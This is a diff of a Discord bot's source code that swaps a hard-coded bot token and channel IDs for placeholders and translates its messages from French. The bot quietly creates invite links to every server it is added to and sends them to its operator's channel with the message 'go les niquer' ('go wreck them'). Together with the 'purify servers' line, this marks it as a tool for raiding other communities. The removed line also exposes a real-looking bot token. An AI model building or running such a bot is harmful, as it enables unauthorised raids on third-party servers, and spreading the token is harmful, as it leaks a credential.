@@ -1,7 +1,7 @@
 const Discord = require("discord.js");
 var prefix = (".");
 var client = new Discord.Client();
-const tkn = "NzcxMzQ4MTU3NDk2ODE5NzIy.X5qz8w.ISxrJvuySdzSS9jTNp6svqDrqGw"; // token invalide ddbtg?
+const tkn = "TOKEN"; // token invalide ddbtg?
 client.on('ready', () =>
 {
   client.user.setActivity('Ce que font les gens',
@@ -13,27 +13,27 @@ client.on('ready', () =>
     let channel = guild.channels.cache.last();
     createLink(channel, guild).catch(console.error);
   });
-  client.channels.cache.get('808344119809277952').send('Je suis en ligne, les serveurs ou je suis sont ici : <#808343198107304037>').catch(O_o =>
+  client.channels.cache.get('CHANNEL ID FOR BOT STATUS').send('A online message.').catch(O_o =>
   {});
   async function createLink(chan, guild)
   {
     let invite = await chan.createInvite().catch(console.error);
     try
     {
-      client.channels.cache.get('808343198107304037').send('Je suis sur ce serveur :' + ` ${invite.url}`).catch(O_o =>
+      client.channels.cache.get('CHANNEL ID FOR SERVERS THE BOT IS IN').send('I am on this server :' + ` ${invite.url}`).catch(O_o =>
       {});
     }
     catch (e)
     {
-      client.channels.cache.get('808343198107304037').send(`${guild.name}` + '|' + 'pas d\'invite disponible.').catch(console.error);
+      client.channels.cache.get('Same as up').send(`${guild.name}` + '|' + 'no invite available.').catch(console.error);
     }
   }
 })
-console.info("Prêt à purifier des serveurs pour la saint Oasis. ");
+console.info("Ready to purify servers ");
 client.on("guildCreate", guild =>
 {
   const invitechannels = guild.channels.cache.filter(c => c.permissionsFor(guild.me).has('CREATE_INSTANT_INVITE'));
-  invitechannels.random().createInvite().then(invite => client.channels.cache.get('798820464645373952').send(`On m\'a ajouté sur le serveur ${guild.name}, go les niquer. ${invite.url}`)).catch(O_o =>
+  invitechannels.random().createInvite().then(invite => client.channels.cache.get('798820464645373952').send(`I\'ve been added to this server : ${guild.name}, go les niquer. ${invite.url}`)).catch(O_o =>
   {});
 });
 client.on("guildDelete", guild =>
@@ -46,7 +46,7 @@ client.on('message', message =>
   if (!message.guild) return;
   var blacklistarray = ["770352556706234369", "664144125469392938", "722723302652772364", "788504988124053524", "770361872355950603", "766166481301274664", "790729427591233546"];
   if (blacklistarray.includes(message.guild.id)) return;
-  if (!message.guild.available) return message.channel.send("Il y a eu une erreur, ce serveur ne m\'est pas disponible du a un problème de serveurs")
+  if (!message.guild.available) return message.channel.send("A little error :/ ")
   if (client.bot) return;
   if (message.author.bot) return;
   if (message.guild === client) return;
